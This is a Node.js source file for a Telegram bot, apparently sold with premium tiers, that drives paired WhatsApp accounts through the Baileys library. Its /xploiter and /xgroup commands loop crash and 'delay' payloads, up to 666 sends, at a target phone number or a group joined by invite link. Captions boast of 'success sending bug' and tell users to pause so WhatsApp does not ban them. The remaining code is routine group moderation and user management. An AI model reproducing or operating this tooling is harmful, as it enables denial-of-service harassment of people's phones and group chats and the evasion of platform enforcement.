const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header,
	encodeSignedDeviceIdentity,
	jidEncode,
	jidDecode,
	encodeWAMessage,
	patchMessageBeforeSending,
	encodeNewsletterMessage,
	getUSyncDevices,
	default: makeWaSocket,
	makeWASocket,
	useMultiFileAuthState
} = require("baileys");
let fs = require('fs');
fs = require('fs-extra');
const path = require('path');
const axios = require('axios');
const chalk = require('chalk');
const { Telegraf } = require("telegraf");
const myfunction = require('./function/myfunction.js');
const config = require("./settings/config.js");
const index = require('./index.js');
const { initializeWhatsAppConnections } = index;
const { client } = index;
const BOT_TOKEN = config.tokens;

//=================================================//
async function invisible(isTarget) {
  for (let i = 0; i < 666; i++) {
    await index.galaxy(isTarget);
    console.log(chalk.green(`🍀 BILAL-MD TEAM⃜ : ${isTarget}`));
    await myfunction.sleep(5000);
  }
}

//=================================================//
async function trashios(isTarget) {
  for (let i = 0; i < 666; i++) {
    await index.TrashLocIOS(isTarget);
    console.log(chalk.green(`🍀 BILAL-MD TEAM⃜ : ${isTarget}`));
    await myfunction.sleep(5000);
  }
}
//=================================================//
async function group_delays(isTarget) {
  for (let i = 0; i < 666; i++) {
    await index.galaxyV2(isTarget);
    console.log(chalk.green(`🍀 BILAL-MD TEAM⃜ : ${isTarget}`));
    await myfunction.sleep(500);
  }
}

//=================================================//
async function group_freze(isTarget) {
  for (let i = 0; i < 1; i++) {
    await index.InViteAdminA(isTarget, false);
    await index.InViteAdminI(isTarget, false);
    console.log(chalk.green(`🍀 BILAL-MD TEAM⃜ : ${isTarget}`));
    await myfunction.sleep(5000);
  }
}

//=================================================//
function setupCommands(bot) {

//=================================================//
async function StatusConnectionWhatsapp() {
  const ownerId = Array.isArray(config.owner) ? config.owner[0] : config.owner;

  await initializeWhatsAppConnections(ownerId, {
    chat: { id: ownerId },
    reply: (text, options) => {
        return bot.telegram.sendMessage(ownerId, text, options);
    }
  });
}

//=================================================//
    bot.start((ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
        const status = myfunction.getUserStatus(ctx.from.id.toString());
        
        const keyboard = [
            [
                { text: "⌜ 🍀 BILAL-MD TEAM ⌟", callback_data: "/bugmenu" },
                { text: "⌜ System ⌟", callback_data: "/system" }],
            [
                { text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }
            ]
        ];
        
        ctx.replyWithPhoto("https://f.top4top.io/p_3635cqtvy1.jpg",{
            caption: `<blockquote><b>🚀 Welcome, @${username}!</b>

— <b>ⓘ Information</b>
⬡ Author: <a href="https://t.me/imBilalking_982">#imBilalking_982</a>
⬡ Status: ${status}
⬡ Runtime: ${runtime}
⬡ Version: 2.0 ( Free )

❓ Stay Connected ! bot
Join Ur <a href="https://t.me/ajjeidnxoeodjnd">Telegram Channel</a>
Save Ur <a href="https://t.me/imBilalking_982">Telegram Owner</a>

©️ running since 2022 to 26##?</blockquote>`,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        });
    });

    //=================================================//
    bot.action("/bugmenu", async (ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
        const status = myfunction.getUserStatus(ctx.from.id.toString());
        
        const keyboard = [
            [
                { text: "🔙", callback_data: "/start" }
            ]
        ];
        
        await ctx.editMessageCaption(
            `<blockquote><b>🚀 Welcome, @${username}!</b>

— <b>ⓘ Information</b>
⬡ Author: <a href="https://t.me/imBilalking_982">#imBilalking_982</a>
⬡ Status: ${status}
⬡ Runtime: ${runtime}
⬡ Version: 2.0 ( Free )

┌────────
├─── ▢ <b>( 𖣂 ) Crash Tools</b>
┠─ ▢ <b>premium user</b>
├─ /xploiter - Select Ur Number
├─ /xgroup - Select Ur Groups
└
©️ running since 2022 to 26##?</blockquote>`,
            {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: keyboard }
            }
        );
        await ctx.answerCbQuery();
    });

    //=================================================//
    bot.action("/system", async (ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
        const status = myfunction.getUserStatus(ctx.from.id.toString());
        
        const keyboard = [
            [
                { text: "🔙", callback_data: "/start" }
            ]
        ];
        
        await ctx.editMessageCaption(
            `<blockquote><b>🚀 Welcome, @${username}!</b>

— <b>ⓘ Information</b>
⬡ Author: <a href="https://t.me/imBilalking_982">#imBilalking_982</a>
⬡ Status: ${status}
⬡ Runtime: ${runtime}
⬡ Version: 2.0 ( Free )

┌────────
├─── ▢ <b>( 𖣂 ) Group Tools</b>
┠─ ▢ <b>group include</b>
├─ /kick /add
├─ /ban /unban
├─ /promote /demote
├─ /mute /unmute
├─ /pin /unpin
└

┌────────
├─── ▢ <b>( 𖣂 ) Owner Acces</b>
┠─ ▢ <b>owner include</b>
├─ /addprem ‹id days›
├─ /delprem ‹button›
├─ /addadmin ‹id days›
├─ /deladmin ‹button›
└

┌────────
├─── ▢ <b>( 𖣂 ) Settings Bot</b>
┠─ ▢ <b>owner include</b>
├─ /reqpair /clearsesi
├─ /mysessions
├─ /setjeda /grouponly
└
©️ running since 2022 to 26##?</blockquote>`,
            {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: keyboard }
            }
        );
        await ctx.answerCbQuery();
    });
    
    //=================================================//
    bot.action("/start", async (ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
        const status = myfunction.getUserStatus(ctx.from.id.toString());
        
        const keyboard = [
            [
                { text: "⌜ 🍀 BILAL-MD TEAM ⌟", callback_data: "/bugmenu" },
                { text: "⌜ System ⌟", callback_data: "/system" }],
            [
                { text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }
            ]
        ];
        
        await ctx.editMessageCaption(
            `<blockquote><b>🚀 Welcome, @${username}!</b>

— <b>ⓘ Information</b>
⬡ Author: <a href="https://t.me/imBilalking_982">#imBilalking_982</a>
⬡ Status: ${status}
⬡ Runtime: ${runtime}
⬡ Version: 2.0 ( Free )

❓ Stay Connected ! bot
Join Ur <a href="https://t.me/ajjeidnxoeodjnd">Telegram Channel</a>
Save Ur <a href="https://t.me/imBilalking_982">Telegram Owner</a>

©️ running since 2022 to 26##?</blockquote>`,
            {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: keyboard }
            }
        );
        await ctx.answerCbQuery();
    });
    
    //=================================================//
    bot.command("reqpair", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply("❌ Example Use.\n /reqpair 92xxx");
        }

        const BotNumber = args[1];
        await index.connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
    });

    //=================================================//
    bot.command("mysessions", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        if (index.sessions.size === 0) {
            return ctx.reply("🚫 You are not connected to WhatsApp, please connect first with /reqpair");
        }

        const list = [...index.sessions.keys()].map(n => `• ${n}`).join("\n");
        ctx.reply(`*! Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
    });

    //=================================================//
    bot.command("clearsesi", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply("❌ Example Use.\n /clearsesi 92xxx");
        }

        const number = args[1];
        if (!index.sessions.has(number)) {
            return ctx.reply("🚫 Number not found");
        }

        const sessionDir = index.sessionPath(number);
        index.sessions.get(number).end(); 
        index.sessions.delete(number);
        fs.rmSync(sessionDir, { recursive: true, force: true });

        const data = JSON.parse(fs.readFileSync(index.file_session));
        const updated = data.filter(n => n !== number);
        fs.writeFileSync(index.file_session, JSON.stringify(updated));

        ctx.reply(`✅ Sender *${number}* deleted.`, { parse_mode: "Markdown" });
    });

    //=================================================//
    bot.command("addprem", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (myfunction.sendIfNotOwner) {
            const allowed = await myfunction.sendIfNotOwner(ctx);
            if (!allowed) return;
        }
        
        const args = ctx.message.text.split(" ");
        if (args.length < 3) {
            return ctx.reply("❌ Example Use.\n /addprem 12345678 30");
        }

        const targetUserId = args[1];
        const days = parseInt(args[2]) || 30;

        if (myfunction.addPremium) {
            myfunction.addPremium(targetUserId, days);
        }
        
        await ctx.replyWithPhoto(myfunction.меню(),{
            caption: `✅ *Successfully Premium Added*\n\n• User ID: ${targetUserId}\n• Duration: ${days} days\n• Expires: ${new Date(Date.now() + days * 24 * 60 * 60 * 1000).toLocaleDateString()}\n\nUser can now use WhatsApp bug features.`,
            parse_mode: 'Markdown',
            reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/rizxvelzinfinity" }]]
                }
        });
    });

    //=================================================//
    bot.command("delprem", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const databaseDir = path.join(__dirname, './myfunction/database');
        const premiumPath = path.join(databaseDir, 'premium.json');
        premiumUsers = JSON.parse(fs.readFileSync(premiumPath));
        
        if (premiumUsers.length === 0) {
            return ctx.reply("❌ No premium users.");
        }

        const buttons = [];
        for (let i = 0; i < premiumUsers.length; i++) {
            const user = premiumUsers[i];
            const buttonText = `ID: ${user.id} | ${user.expired ? new Date(user.expired).toLocaleDateString() : 'Lifetime'}`;
            
            if (i % 2 === 0) {
                buttons.push([{ text: buttonText, callback_data: `delprem_${user.id}` }]);
            } else {
                buttons[buttons.length - 1].push({ text: buttonText, callback_data: `delprem_${user.id}` });
            }
        }

        buttons.push([{ text: "❌ Cancel", callback_data: "cancel_delprem" }]);

        ctx.reply("📋 Select user to remove from premium:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    });

    bot.action(/delprem_(.+)/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) {
            return ctx.answerCbQuery("❌ Not authorized!", { show_alert: true });
        }

        const targetUserId = ctx.match[1];
        
        if (myfunction.delPremium) {
            myfunction.delPremium(targetUserId);
        }

        ctx.editMessageText(`✅ User ${targetUserId} removed from premium.`);
        ctx.answerCbQuery("User removed!");
    });

    bot.action("cancel_delprem", async (ctx) => {
        ctx.deleteMessage();
        ctx.answerCbQuery("Cancelled!");
    });
    
    //=================================================//
    bot.command("addadmin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        const args = ctx.message.text.split(" ");
        if (args.length < 2) return ctx.reply("❌ Example Use.\n /addadmin 12345");

        const isTarget = args[1];
        myfunction.addAdmin(isTarget);
        await ctx.replyWithPhoto(myfunction.меню(),{
            caption: `✅ *Successfully Admin Added*\n\n• User ID: ${isTarget}\n\nUser can now use WhatsApp bug features.`,
            parse_mode: 'Markdown',
            reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }]]
                }
        });
    });
    
    //=================================================//
    bot.command("deladmin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const databaseDir = path.join(__dirname, './myfunction/database');
        const adminPath = path.join(databaseDir, 'admin.json');
        
        let adminUsers = [];
        try {
            if (fs.existsSync(adminPath)) {
                adminUsers = JSON.parse(fs.readFileSync(adminPath, 'utf8'));
                if (!Array.isArray(adminUsers)) {
                    adminUsers = [];
                }
            }
        } catch (e) {
            return ctx.reply("❌ Error loading admin list.");
        }

        if (adminUsers.length === 0) {
            return ctx.reply("❌ No admin users registered.");
        }

        const buttons = [];
        for (let i = 0; i < adminUsers.length; i++) {
            const user = adminUsers[i];
            const buttonText = `ID: ${user}`;
            
            if (i % 2 === 0) {
                buttons.push([{ text: buttonText, callback_data: `deladmin_${user}` }]);
            } else {
                buttons[buttons.length - 1].push({ text: buttonText, callback_data: `deladmin_${user}` });
            }
        }

        buttons.push([{ text: "❌ Cancel", callback_data: "cancel_deladmin" }]);

        ctx.reply("📋 Select user to remove from admin:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    });

    //=================================================//
    bot.action(/deladmin_(.+)/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) {
            return ctx.answerCbQuery("❌ Not authorized!", { show_alert: true });
        }

        const targetUserId = ctx.match[1];
        
        if (myfunction.delAdmin) {
            myfunction.delAdmin(targetUserId);
        } else {
            return ctx.editMessageText(`❌ Error: delAdmin function not found.`);
        }

        ctx.editMessageText(`✅ User ${targetUserId} removed from admin.`, {
            reply_markup: {
                inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }]]
            }
        });
        ctx.answerCbQuery("User removed!");
    });

    //=================================================//
    bot.action("cancel_deladmin", async (ctx) => {
        ctx.deleteMessage();
        ctx.answerCbQuery("Cancelled!");
    });

    //=================================================//
    bot.command("grouponly", async (ctx) => {
        const args = ctx.message.text.split(" ");
        const mode = args[1]?.toLowerCase();
        const userId = ctx.from.id.toString();

        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (mode !== "on" && mode !== "off") {
            return ctx.reply("❌ Example Use.\n /grouponly on/off");
        }

        const status = mode === "on";
        myfunction.setGroupOnly(status);
        ctx.replyWithMarkdown(`*Group Only* feature now: ${status ? "Active" : "NonActive"}`);
    });

    //=================================================//
    bot.command("xploiter", async (ctx) => {
        const userId = ctx.from.id.toString();
        const commandName = "xploiter";
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        if (index.sessions.size === 0) return ctx.reply("❌ You must reqpair your WhatsApp first using /reqpair 92xxx");
        
        const cooldownRemaining = myfunction.checkCooldown(commandName);
        if (cooldownRemaining > 0) {
            const minutes = Math.floor(cooldownRemaining / 60);
            const seconds = cooldownRemaining % 60;
            return ctx.reply(`‼️ Cooldown: ${minutes}m ${seconds}s.`);
        }
        
        const args = ctx.message.text.trim().split(" ");
        if (args.length < 2) return ctx.reply(`❌ Example Use.\n /xploiter 92xxx`);
        
        const targetNumber = args[1].replace(/[^0-9]/g, "");
        if (!targetNumber) return ctx.reply(`❌ Invalid number.`);
        
        const isTarget = `${targetNumber}@s.whatsapp.net`;
        
        await ctx.replyWithPhoto({ 
            url: myfunction.bugimg()
        }, {
            caption: `\n🩸⃟༑⌁⃰"🩸⃟⃨〫⃰‣ ⁖BILAL MD TEAM"𝐭ཀ͜͡🦠 : ${targetNumber}\n`,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "𝐃𝚵𝐋𝚫𝐘𝐒", callback_data: `delays ${isTarget}` },
                        { text: "𝚫𝐏𝐏𝐋𝚵 𝐂𝐑𝚫𝐒𝐇", callback_data: `appcrashed ${isTarget}` }
                    ]
                ]
            }
        });
        myfunction.setCooldown(commandName);
    });

    //=================================================//
    bot.action(/^delays (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        invisible(isTarget);
        await ctx.answerCbQuery(`〽️ Starting Delay InVis On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗻𝗩𝗶𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : Android/Ios\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }]]
                }
            }
        );
        
        invisible(isTarget);
    });

    //=================================================//
    bot.action(/^appcrashed (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        
        await ctx.answerCbQuery(`🍏 Starting Apple Crashed On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗧𝗿𝗮𝘀𝗵𝗜𝗢𝗦\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : IOS\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }]]
                }
            }
        );
        
        trashios(isTarget);
    });

    //=================================================//
    bot.command("xgroup", async (ctx) => {
        const commandName = "xgroup";
        const args = ctx.message.text.split(" ");
        const groupLink = args[1];
        
        const cooldownRemaining = myfunction.checkCooldown(commandName);
        if (cooldownRemaining > 0) {
            const minutes = Math.floor(cooldownRemaining / 60);
            const seconds = cooldownRemaining % 60;
            return ctx.reply(`‼️ Cooldown: ${minutes}m ${seconds}s.`);
        }
        
        if (!groupLink) {
            return ctx.reply(`❌ Example Use.\n /xgroup chat.whatsapp.com`);
        }
        
        try {            
            const groupId = await index.joinGroup(groupLink);
            
            await ctx.replyWithPhoto({ url: myfunction.bugimg() }, {
                caption: `\n🩸⃟༑⌁⃰"🩸⃟⃨〫⃰‣ ⁖BILAL MD TEAM"ཀ͜͡🦠 : ${groupId}\n`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "𝐃𝚵𝐋𝚫𝐘𝐒", callback_data: `group_delays_${groupId}` },
                            { text: "𝐅𝐑𝚵𝐙𝚵", callback_data: `group_freze_${groupId}` }
                        ]
                    ]
                }
            });
            
            myfunction.setCooldown(commandName);
        } catch (error) {
            ctx.reply(`❌ Error: ${error.message}`);
        }
    });

    //=================================================//
    bot.action(/^group_freze_(.+)$/, async (ctx) => {
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        
        await ctx.answerCbQuery(`❄️ Starting Group Freeze Attack...`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐆𝐑𝐎𝐔𝐏 𝐅𝐑𝐄𝐄𝐙𝐄 𝐒𝐔𝐂𝐂𝐄𝐒𝐒\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${isTarget}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗚𝗿𝗼𝘂𝗽 𝗙𝗿𝗲𝗲𝘇𝗲\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : All Devices\n\n𝘕𝘰𝘵𝘦 :\n𝘎𝘳𝘰𝘶𝘱 𝘸𝘪𝘭𝘭 𝘦𝘹𝘱𝘦𝘳𝘪𝘦𝘯𝘤𝘦 𝘴𝘦𝘷𝘦𝘳𝘦 𝘭𝘢𝘨𝘴 𝘢𝘯𝘥 𝘧𝘳𝘦𝘦𝘻𝘦𝘴`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }]]
                }
            }
        );
        
        await group_freze(isTarget);
    });

    //=================================================//
    bot.action(/^group_delays_(.+)$/, async (ctx) => {
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        
        await ctx.answerCbQuery(`〽️ Starting Group Delays Attack...`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐆𝐑𝐎𝐔𝐏 𝐃𝐄𝐋𝐀𝐘𝐒 𝐒𝐔𝐂𝐂𝐄𝐒𝐒\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${isTarget}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗚𝗿𝗼𝘂𝗽 𝗗𝗲𝗹𝗮𝘆𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : All Devices\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/imBilalking_982" }]]
                }
            }
        );
        
        await group_delays(isTarget);
    });

    //=================================================//
    bot.command("setjeda", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.trim().split(" ");
        if (args.length < 2) {
            return ctx.reply("❌ Example Use.\n /setjeda 5h,m,s");
        }
        
        const result = myfunction.setCooldownTime(args[1]);
        ctx.reply(result);
    });
    
    //=================================================//
    bot.command("kick", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.kickChatMember(chatId, targetUserId);
        await ctx.telegram.unbanChatMember(chatId, targetUserId);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `✅ User kicked successfully!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("ban", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.kickChatMember(chatId, targetUserId);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `🚫 User banned permanently!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("unban", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.split(" ");
        if (args.length < 2 && !ctx.message.reply_to_message) {
            return ctx.reply("❌ Example: /unban user_id");
        }

        let targetUserId;
        if (ctx.message.reply_to_message) {
            targetUserId = ctx.message.reply_to_message.from.id;
        } else {
            targetUserId = args[1];
        }

        const chatId = ctx.chat.id;

        await ctx.telegram.unbanChatMember(chatId, targetUserId);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `✅ User unbanned!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("promote", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.promoteChatMember(chatId, targetUserId, {
            can_change_info: true,
            can_delete_messages: true,
            can_invite_users: true,
            can_restrict_members: true,
            can_pin_messages: true,
            can_promote_members: false
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `✅ User promoted to admin!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("demote", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.promoteChatMember(chatId, targetUserId, {
            can_change_info: false,
            can_delete_messages: false,
            can_invite_users: false,
            can_restrict_members: false,
            can_pin_messages: false,
            can_promote_members: false
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `‼️ User demoted from admin!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("mute", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;
        
        const args = ctx.message.text.split(" ");
        let muteTime = 3600;
        
        if (args.length > 1) {
            const timeStr = args[1].toLowerCase();
            if (timeStr.includes("h")) {
                muteTime = parseInt(timeStr) * 3600;
            } else if (timeStr.includes("m")) {
                muteTime = parseInt(timeStr) * 60;
            } else if (timeStr.includes("d")) {
                muteTime = parseInt(timeStr) * 86400;
            } else {
                muteTime = parseInt(timeStr) || 3600;
            }
        }

        const untilDate = Math.floor(Date.now() / 1000) + muteTime;
        await ctx.telegram.restrictChatMember(chatId, targetUserId, {
            until_date: untilDate,
            can_send_messages: false
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `🔇 User muted!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("unmute", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to user message!");
        }

        const targetUserId = ctx.message.reply_to_message.from.id;
        const chatId = ctx.chat.id;

        await ctx.telegram.restrictChatMember(chatId, targetUserId, {
            can_send_messages: true,
            can_send_media_messages: true,
            can_send_polls: true,
            can_send_other_messages: true
        });
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `🔊 User unmuted!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("pin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (!ctx.message.reply_to_message) {
            return ctx.reply("❌ Reply to message!");
        }

        await ctx.telegram.pinChatMessage(ctx.chat.id, ctx.message.reply_to_message.message_id);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `📌 Message pinned!`,
            parse_mode: 'HTML'
        });
    });

    //=================================================//
    bot.command("unpin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        await ctx.telegram.unpinChatMessage(ctx.chat.id);
        
        await ctx.replyWithPhoto(myfunction.меню(), {
            caption: `📌 Message unpinned!`,
            parse_mode: 'HTML'
        });
    });

//=================================================//
StatusConnectionWhatsapp();
}
//=================================================//
module.exports = { setupCommands };